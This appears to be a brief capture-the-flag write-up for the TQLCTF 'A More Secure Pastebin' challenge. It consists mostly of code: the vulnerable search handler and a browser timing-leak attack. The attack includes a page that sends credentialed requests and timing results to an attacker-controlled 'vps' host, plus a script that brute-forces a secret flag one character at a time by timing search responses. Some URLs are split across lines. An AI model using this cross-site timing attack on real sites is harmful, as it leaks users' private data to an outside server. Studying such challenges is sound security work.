# Writeup for A More Secure Pastebin – Practical Timeless Timing in Browser

> 原文: https://www.ctfiot.com/27109.html
> ID: 27109


```
const searchRgx = new RegExp(escapeStringRegexp(word), "gi");
// No time to implemente the pagination. So only show 5 results first.
let paste = await Pastes.find({
 content: searchRgx,
})
 .sort({ date: "asc" })
 .limit(5);
if (paste && paste.length > 0) {
 let data = [];
 await Promise.all(
 paste.map(async (p) => {
 let user = await User.findOne({ username: p.username });
 data.push({
 pasteid: p.pasteid,
 title: p.title,
 content: p.content,
 date: p.date,
 username: user.username,
 website: user.website,
 });
 })
 );
 return res.json({ status: "success", data: data });
} else {
 return res.json({ status: "fail", data: [] });
}
// 伪代码
for (let i = 0; i < 10; i += 1) {
 let p1 = fetch("https://zedd.zz:
1443/admin/searchword?word=flag{aa")
 let p2 = fetch("https://zedd.zz:
1443/admin/searchword?word=flag{ab")
 let diffs = await Promise.all([p1.then(1), p2.then(-1)]);
 if (diffs[0] !== undefined) {
 return diffs[0];
 }
 return diffs[1];
}
<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Document</title>
 <!--头部-->
 <script>
 const start = Date.now()
 </script>
 <script>
 abc = () => {
 const end = Date.now()
 var req = new XMLHttpRequest();
 req.open('get',`http://vps/result?word=TQLCTF{5b2e5a7f&ms=${end - start}`,true);
 req.withCredentials = true;
 req.send();
 }
 </script>
<!--底部-->
</head>

 

</html>
const SEARCH_URL = 'https://proxy:
443/admin/searchword?word=';

async function timing(term) {
 let cnt = 0;
 for(let i=0; i<30; i++) {
 let val = await Promise.any([search_req(term), search_req('_404_404_404')]);
 if(val===term) cnt++;
 await sleep(50);
 }
 return cnt;
}

async function run() {
 await report('started');
 let res = [];
 for(let c of CHARSET)
 res.push(await timing('TQLCTF{'+c));
 await report(`res_${res.join('_')}`);
}
```
